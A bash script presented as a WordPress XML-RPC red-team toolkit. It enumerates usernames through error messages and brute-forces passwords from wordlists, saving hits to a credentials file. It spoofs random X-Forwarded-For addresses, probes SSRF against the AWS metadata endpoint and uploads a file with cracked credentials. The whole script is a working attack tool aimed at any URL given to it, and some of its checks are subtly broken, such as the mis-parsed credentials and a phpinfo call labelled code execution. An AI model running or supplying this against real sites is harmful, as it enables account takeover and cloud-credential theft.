#!/bin/bash

# -------------------------------
# XML-RPC Red Team Toolkit (cURL)
# Author: [Your Name]
# Purpose: Structured XML-RPC vulnerability assessment
# Methodology: OWASP Web Testing Guide + WordPress Hardening Standards
# -------------------------------

# Configuration
TARGET="${1:-http://target.com}"
XMLRPC="$TARGET/xmlrpc.php"
RSD="$TARGET/xmlrpc.php?rsd"
USER_FILE="${2:-userlist.txt}"
PASS_FILE="${3:-passlist.txt}"
OUTPUT_DIR="xmlrpc_scan_results"
COOKIE_JAR="$OUTPUT_DIR/cookies.txt"
SSRF_TEST_URL="http://169.254.169.254/latest/meta-data/"  # AWS metadata endpoint
DEBUG=0  # Set to 1 for verbose output

# Initialize
mkdir -p "$OUTPUT_DIR"
rm -f "$COOKIE_JAR"
trap "echo '[!] Script interrupted by user'; exit 130" SIGINT

# Helper functions
log() {
    echo "[$(date +'%T')] $1"
}

debug() {
    [[ $DEBUG -eq 1 ]] && echo "[DEBUG] $1"
}

send_xml_request() {
    local xml_data="$1"
    local output_file="$2"
    curl -s -k -L -X POST "$XMLRPC" \
        -H 'Content-Type: text/xml' \
        -H "X-Forwarded-For: $((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256))" \
        -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
        --data "$xml_data" \
        --output "$output_file" \
        --connect-timeout 15 \
        --max-time 25
    return $?
}

# --------[0] Initial Checks --------
log "Starting XML-RPC assessment for $TARGET"
log "Saving results to: $OUTPUT_DIR/"

# Check RSD discovery
log "Checking for RSD discovery document..."
curl -s -k -o "$OUTPUT_DIR/rsd.xml" "$RSD"
if grep -q 'apis' "$OUTPUT_DIR/rsd.xml"; then
    log "[+] RSD document found"
    xmllint --format "$OUTPUT_DIR/rsd.xml" | grep 'apiLink' | head -n 5
else
    log "[-] RSD document not found"
fi

# --------[1] XML-RPC Service Detection --------
log "Testing XML-RPC endpoint existence..."
if ! curl -s -k --head "$XMLRPC" | grep -q "HTTP.*200"; then
    log "[!] XML-RPC endpoint not found (HTTP 404)"
    exit 1
fi

# --------[2] Method Enumeration --------
log "Enumerating XML-RPC methods..."
METHODS_XML="$OUTPUT_DIR/methods.xml"
METHODS_LOG="$OUTPUT_DIR/methods_raw.log"
send_xml_request '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params/></methodCall>' "$METHODS_XML"

# Log the raw response for debugging
cp "$METHODS_XML" "$METHODS_LOG"
log "[i] Raw method enumeration response saved to $METHODS_LOG"

if grep -q '<methodResponse>' "$METHODS_XML"; then
    if grep -q '<fault>' "$METHODS_XML"; then
        log "[!] XML-RPC responded with a fault during method enumeration."
        grep -A3 '<fault>' "$METHODS_XML" | grep '<string>' | sed 's/<[^>]*>//g'
        exit 2
    fi

    log "[+] XML-RPC is enabled. Available methods:"
    if command -v xmllint >/dev/null 2>&1; then
        xmllint --xpath "//string/text()" "$METHODS_XML" 2>/dev/null | tr ' ' '\n' | sort | uniq | tee "$OUTPUT_DIR/methods.txt"
    else
        grep -Eo '<string>[^<]+</string>' "$METHODS_XML" | sed 's/<string>//;s/<\/string>//' | sort | uniq | tee "$OUTPUT_DIR/methods.txt"
    fi

    # Check dangerous methods
    for method in pingback.ping system.multicall wp.getUsersBlogs; do
        if grep -qx "$method" "$OUTPUT_DIR/methods.txt"; then
            log "[!] Potentially dangerous method: $method"
        fi
    done
else
    log "[!] XML-RPC not enabled or blocked (no <methodResponse> in reply)"
    exit 2
fi

# --------[3] Username Enumeration --------
log "Starting username enumeration..."
if [[ ! -f "$USER_FILE" ]]; then
    echo -e "admin\nwp-admin\nwordpress\ntest\n${TARGET##*/}" > "$USER_FILE"
fi

declare -a VALID_USERS
while IFS= read -r user; do
    USER_XML="$OUTPUT_DIR/user_${user// /_}.xml"
    send_xml_request "<?xml version=\"1.0\"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>$user</string></value></param><param><value><string>invalid_password</string></value></param></params></methodCall>" "$USER_XML"
    
    if grep -q 'faultCode' "$USER_XML"; then
        if grep -q 'Incorrect username' "$USER_XML"; then
            debug "[-] Invalid user: $user"
        else
            log "[+] Potential valid user: $user"
            VALID_USERS+=("$user")
        fi
    else
        log "[!] Unexpected response for user: $user"
    fi
done < "$USER_FILE"

# --------[4] Password Bruteforce --------
log "Starting password bruteforce..."
if [[ ${#VALID_USERS[@]} -eq 0 ]]; then
    log "[-] No valid users found. Using common list."
    VALID_USERS=("admin" "wordpress" "test" "wpadmin")
fi

if [[ ! -f "$PASS_FILE" ]]; then
    echo -e "admin\npassword\n123456\nwordpress\n${TARGET##*/}" > "$PASS_FILE"
fi

for user in "${VALID_USERS[@]}"; do
    log "Attacking user: $user"
    while IFS= read -r pass; do
        PASS_XML="$OUTPUT_DIR/pass_${user// /_}_${pass// /_}.xml"
        send_xml_request "<?xml version=\"1.0\"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>$user</string></value></param><param><value><string>$pass</string></value></param></params></methodCall>" "$PASS_XML"
        
        if grep -q 'isAdmin' "$PASS_XML"; then
            log "[!] SUCCESS: $user:$pass"
            echo "$user:$pass" >> "$OUTPUT_DIR/valid_credentials.txt"
            break
        fi
    done < "$PASS_FILE"
done

# --------[5] SSRF Testing --------
log "Testing for SSRF via pingback..."
PINGBACK_XML="$OUTPUT_DIR/pingback_test.xml"
send_xml_request "<?xml version=\"1.0\"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>$SSRF_TEST_URL</string></value></param><param><value><string>$XMLRPC</string></value></param></params></methodCall>" "$PINGBACK_XML"

if grep -q 'faultCode' "$PINGBACK_XML"; then
    grep -A1 'faultString' "$PINGBACK_XML" | grep '<string>' | sed 's/<string>/* /'
else
    log "[!] Possible SSRF vulnerability detected"
fi

# --------[6] Code Execution Checks --------
log "Testing for code execution vulnerabilities..."
send_xml_request '<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data><value><struct><member><name>methodName</name><value><string>phpinfo</string></value></member></struct></value></data></array></value></param></params></methodCall>' "$OUTPUT_DIR/exec_test.xml"

if grep -q 'PHP Version' "$OUTPUT_DIR/exec_test.xml"; then
    log "[!] CRITICAL: Code execution vulnerability confirmed"
else
    log "[-] No code execution via standard methods"
fi

# --------[7] Post-Exploitation Checks --------
if [[ -f "$OUTPUT_DIR/valid_credentials.txt" ]]; then
    log "Attempting post-exploitation actions..."
    read -r user pass < <(head -1 "$OUTPUT_DIR/valid_credentials.txt" | cut -d: -f1,2)
    
    # File upload test
    UPLOAD_XML="$OUTPUT_DIR/upload_test.xml"
    send_xml_request "<?xml version=\"1.0\"?><methodCall><methodName>wp.uploadFile</methodName><params><param><value><int>1</int></value></param><param><value><string>$user</string></value></param><param><value><string>$pass</string></value></param><param><value><struct><member><name>name</name><value><string>test.txt</string></value></member><member><name>type</name><value><string>text/plain</string></value></member><member><name>bits</name><value><base64>$(echo 'Proof-of-Concept' | base64)</base64></value></member><member><name>overwrite</name><value><boolean>1</boolean></value></member></struct></value></param></params></methodCall>" "$UPLOAD_XML"
    
    if grep -q 'uploadFile' "$UPLOAD_XML"; then
        log "[!] Successful file upload: $TARGET/wp-content/uploads/test.txt"
    fi
fi

log "Scan completed. Review $OUTPUT_DIR/ for results"